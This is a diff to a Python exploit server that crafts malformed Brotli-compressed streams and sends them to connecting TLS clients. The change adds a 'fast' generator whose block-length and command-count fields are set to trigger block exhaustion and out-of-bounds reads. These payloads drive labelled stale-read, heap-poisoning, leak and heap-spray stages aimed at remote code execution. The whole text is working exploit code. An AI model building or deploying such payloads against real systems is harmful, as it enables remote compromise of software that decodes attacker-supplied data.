@@ -266,10 +266,81 @@ def generate_rce_stream(prefix, command_block_extra, max_commands=None):
     return bits.finish()
 
 
+def generate_rce_stream_fast(prefix, command_block_extra, extra_commands=10000):
+    """Optimized generate_rce_stream with configurable command count.
+
+    Instead of always generating 16M commands (23MB), generates just enough
+    commands to trigger block exhaustion plus extra_commands for OOB effect.
+    """
+    block_length = 16625 + command_block_extra
+    command_count = block_length + extra_commands
+
+    bits = Bits()
+    bits.put(1, 1); bits.put(0, 3); bits.put(2, 3)  # Window WBITS=17
+
+    if prefix:
+        bits.put(0, 1)                     # ISLAST = 0
+        bits.put(0, 2)                     # MNIBBLES
+        bits.put(len(prefix) - 1, 16)      # MLEN-1
+        bits.put(1, 1)                     # ISUNCOMPRESSED = 1
+        if bits.used:
+            bits.put(0, 8 - bits.used)
+        bits.aligned(prefix)
+
+    # MLEN must cover all command output: command_count * 4 bytes
+    mlen = min(command_count * 4, 0xFFFFFF)
+    bits.put(0, 1)                         # ISLAST = 0
+    bits.put(2, 2)                         # MNIBBLES
+    bits.put(mlen & 0xFFFFFF, 24)          # MLEN-1
+    bits.put(0, 1)                         # ISUNCOMPRESSED = 0
+
+    _varlen_u8(bits, 0)                    # NBLTYPESL = 1
+    _varlen_u8(bits, 1)                    # NBLTYPESI = 2
+    _one_symbol_tree(bits, 4, 0)
+    _one_symbol_tree(bits, 26, 25)
+
+    bits.put(command_block_extra & 0xFFFFFF, 24)
+
+    _varlen_u8(bits, 0)                    # NBLTYPESD = 1
+    bits.put(3, 6)                         # NPOSTFIX/NDIRECT
+    bits.put(0, 2)                         # context mode
+
+    _varlen_u8(bits, 0)                    # NTREESL
+    _varlen_u8(bits, 0)                    # NTREESD
+
+    _one_symbol_tree(bits, 256, 0)
+    _one_symbol_tree(bits, 704, 130)
+    _one_symbol_tree(bits, 704, 130)
+    _one_symbol_tree(bits, 400, 184)
+
+    distance_extra = (len(prefix) + 32) // 8 if prefix else 4
+    completed = 0
+    while bits.used and completed < command_count:
+        bits.put(distance_extra, 11)
+        completed += 1
+
+    group = Bits()
+    for _ in range(8):
+        group.put(distance_extra, 11)
+    group_bytes = group.finish()
+    groups, tail = divmod(command_count - completed, 8)
+    bits.aligned(group_bytes * groups)
+    for _ in range(tail):
+        bits.put(distance_extra, 11)
+
+    return bits.finish()
+
+
 def build_rce_stream(prefix_bytes, command_block_extra=0xFFFFFF):
     """Build complete RCE stream: prefix meta-block + trigger meta-block + padding.
     Matches dimas rce_stage_one() pattern."""
     return generate_rce_stream(prefix_bytes, command_block_extra) + b"\x00" * 3
+
+
+def build_rce_stream_fast(prefix_bytes, command_block_extra=0x003F0F, extra=10000):
+    """Build optimized RCE stream with minimal command count.
+    Much smaller than the full 23MB stream — typically 50-150KB."""
+    return generate_rce_stream_fast(prefix_bytes, command_block_extra, extra) + b"\x00" * 3
 
 
 def build_stage1(command_count=40000):
@@ -812,7 +883,7 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
             # containing stale heap data from previous allocations.
             # cbe=0x003F0F gives block_length=32768 for deterministic behavior.
             prefix = b"\x00" * 8
-            payload = build_rce_stream(prefix, 0x003F0F)
+            payload = build_rce_stream_fast(prefix, 0x003F0F)
             print(f"  -> STALE-READ: 8B null prefix, cbe=0x003F0F, total={len(payload)}B")
             _send_br_response(ssl_sock, payload)
 
@@ -828,7 +899,7 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
                 prefix = bytearray(1024)
                 for i in range(0, 1024, 4):
                     struct.pack_into("<I", prefix, i, 0xDEADBEEF)
-                payload = build_rce_stream(bytes(prefix), 0x003F0F)
+                payload = build_rce_stream_fast(bytes(prefix), 0x003F0F)
                 print(f"  -> POISON/LEAK: 1KB DEADBEEF, cbe=0x003F0F, total={len(payload)}B")
                 _send_br_response(ssl_sock, payload)
 
@@ -838,7 +909,7 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
                 prefix = bytearray(1024)
                 for i in range(0, 1024, 8):
                     struct.pack_into("<Q", prefix, i, 0x4141414141414141)
-                payload = build_rce_stream(bytes(prefix), 0x000000)
+                payload = build_rce_stream_fast(bytes(prefix), 0x000000)
                 print(f"  -> POISON/INFO: 1KB pattern, cbe=0x0, total={len(payload)}B")
                 _send_br_response(ssl_sock, payload)
 
@@ -848,7 +919,7 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
                 prefix = bytearray(1024)
                 for i in range(0, 1024, 4):
                     struct.pack_into("<I", prefix, i, 0xCAFEBABE)
-                payload = build_rce_stream(bytes(prefix), 0x010000)
+                payload = build_rce_stream_fast(bytes(prefix), 0x010000)
                 print(f"  -> POISON/SPRAY: 1KB CAFEBABE, cbe=0x10000, total={len(payload)}B")
                 _send_br_response(ssl_sock, payload)
 
